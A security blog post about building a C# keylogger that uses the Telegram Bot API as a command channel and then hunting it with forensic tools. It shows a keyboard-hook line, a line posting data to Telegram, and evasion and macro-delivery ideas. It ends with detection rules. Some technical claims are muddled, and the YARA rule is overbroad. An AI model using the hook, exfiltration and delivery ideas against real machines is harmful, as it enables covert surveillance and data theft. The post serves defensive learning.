---
layout: post
title: "Simulating the Adversary - Building and Hunting My Own Malware"
date: 2025-07-18
categories: [research]
tags: [malware, keylogger, telegram, c2, hunting, analysis]
permalink: /research/2025/07/18/simulating-the-adversary-building-and-hunting-my-own-malware.html
---

> **How the idea of the project came to mind:**

After completing the TryHackMe SOC Level 1 path and diving into Sektor7's Windows malware dev courses, I came across a video by [@John Hammond](https://www.youtube.com/watch?v=03FPDBjpsKo) showcasing a threat actor using **Telegram Webhooks as a C2 channel**. That sparked the idea: *How can this technique be replicated, investigated, and mapped back to active infrastructure for detection or takedown?*


![Project Overview](/static/img/Simulating_the_Adversary_images/Pasted image 20250716075351.png)
![Project Setup](/static/img/Simulating_the_Adversary_images/Pasted image 20250716075452.png)

> Malware Design & Capabilities

The infected.exe was built in C# and it acts as a keylogger with added support for file download, clipboard sniffing, active window tracking, and it handles multiple sessions. I ran it against Windows 11 with Defender enabled inside a sandboxed VM — no alerts, no obvious flags.

It avoids traditional offensive techniques, instead relying on native Windows APIs to operate under the radar which makes it low-noise on EDRs. It's a good example of LOLBAS-style malware, using the system's own functionality against itself.

It leverages `SetWindowsHookEx` with the `WH_KEYBOARD_LL` flag for stealthy input capture:
```
IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(null), 0);
```

For C2, it uses **Telegram Bot API** via:
```
HttpClient.PostAsync("https://api.telegram.org/botXXX/sendMessage", content);
```
- **DNS fronting** using a custom domain on Cloudflare
- Encrypted via HTTPS 

*Commands*:
 /capture - Screenshot 
![Screenshot Command](/static/img/Simulating_the_Adversary_images/Pasted image 20250716082507.png)
 /report 
![Report Command](/static/img/Simulating_the_Adversary_images/Pasted image 20250716082939.png)
/fetch - Download files up to 50mb from the target machine
![Fetch Command](/static/img/Simulating_the_Adversary_images/Pasted image 20250716082247.png)
 /browse - Search through C:\
![Browse Command](/static/img/Simulating_the_Adversary_images/Pasted image 20250716082422.png)
 /metrics - Retrieve log file

The technique could be further enhanced by hosting the payload on a VPS and delivering it via a **Word VBA macro**, allowing execution without raising suspicion typically associated with a standalone .exe.
![VirusTotal Scan](/static/img/Simulating_the_Adversary_images/Pasted image 20250717091415.png)

Virus Total Scan:
![VirusTotal Scan 1](/static/img/Simulating_the_Adversary_images/virus_total)
![VirusTotal Scan 2](/static/img/Simulating_the_Adversary_images/virus_total1)
![VirusTotal Scan 3](/static/img/Simulating_the_Adversary_images/virus_total2)


> Behavioral Analysis & Artifacts

Process Explorer
![Process Explorer](/static/img/Simulating_the_Adversary_images/Pasted image 20250717130737.png)

We see user32.dll and kernel32.dll ( We know we use it for keylogging hooks )
![DLL Analysis](/static/img/Simulating_the_Adversary_images/Pasted image 20250717131823.png)
We confirm again with:
![Confirmation](/static/img/Simulating_the_Adversary_images/Pasted image 20250717132012.png)

**Finding:**  
The malware spawns from explorer.exe and loads:
- `user32.dll` (keylogging hooks)
- `kernel32.dll` (file operations)

We can confirm this is a keylogger by the string "WH_KEYBOARD_LL" and "SetWindowsHookEx"
![String Analysis](/static/img/Simulating_the_Adversary_images/Pasted image 20250717142214.png)

 A simple way to uncover a Telegram bot token is by running strings.exe on a memory dump and filtering with the following regex:
```
\d{9,10}:[a-zA-Z0-9_-]{35}
```

And Voilà! 
![Token Discovery](/static/img/Simulating_the_Adversary_images/Pasted image 20250717144821.png)


To trace the malware's behavior, I used Process Monitor with targeted filters:
- **Process Name** = infected.exe
- **Operation** contains Reg → to track registry access, especially persistence-related keys
- **Path** contains Temp → to catch any dropped or staged files

We apply the filters and we find that a file was created in Temp directory!
![Process Monitor](/static/img/Simulating_the_Adversary_images/Pasted image 20250717133346.png)

Upon checking the file we find the Admin ID of the Telegram Bot owner alongside all of the commands executed!
![Admin ID Discovery](/static/img/Simulating_the_Adversary_images/Pasted image 20250717134121.png)

The malware repeatedly attempts to load a non-existent DLL (relsave.dll) as part of its evasion logic. It also accesses device-related registry keys, part of my persistence testing during development.
![Registry Analysis](/static/img/Simulating_the_Adversary_images/Pasted image 20250717135303.png)

Now that we have both the **Admin ID** and **Bot Token**, something interesting came up:
![Bot Interaction](/static/img/Simulating_the_Adversary_images/Pasted image 20250717153352.png)
By sending a message to the bot using a simple curl request as long as we have the full Telegram API endpoint we can trigger a response that reveals the username of the account controlling the bot while also sending a message :D


> Network Traffic

Unfortunately, this method won't reveal the token in our case, since the payload uses **DNS fronting** and **`CryptDecrypt.dll`** to keep the token encrypted in memory.
![Network Analysis](/static/img/Simulating_the_Adversary_images/Pasted image 20250717141704.png)
![Encrypted Traffic](/static/img/Simulating_the_Adversary_images/Pasted image 20250717154252.png)


> Mitigation & Defensive Strategy

*Mitigation*
The first step in disrupting this C2 channel is revoking the bot.
```
curl -X POST "https://api.telegram.org/botTOKEN/revoke"  # Replace Token
```

*Network Mitigation*
Block `api.telegram.org` and IP ranges:
- 149.154.167.0/24
- 91.108.4.0/22
Add to proxy/firewall rules and alert on unexpected TLS traffic.


*Defensive Strategies*
A. YARA Rule for Static Detection
```
rule Telegram_Keylogger {
   meta:
      description = "Detects Telegram C2 keyloggers"
   strings:
      $s1 = "WH_KEYBOARD_LL" ascii wide
      $s2 = "/bot" wide
      $s3 = "SetWindowsHookEx" fullword
   condition:
      any of them
}
```

B. Sigma Rule (SIEM Alerting)
```
title: Telegram Keylogger Activity
logsource:
  category: proxy
detection:
  selection:
    dst_port: 443
    dst_ip: 
      - "149.154.167.220"  # Telegram API IP
    method: "POST"
    url: 
      - "/bot*/sendMessage"
      - "/bot*/sendDocument"
  condition: selection
level: high
```




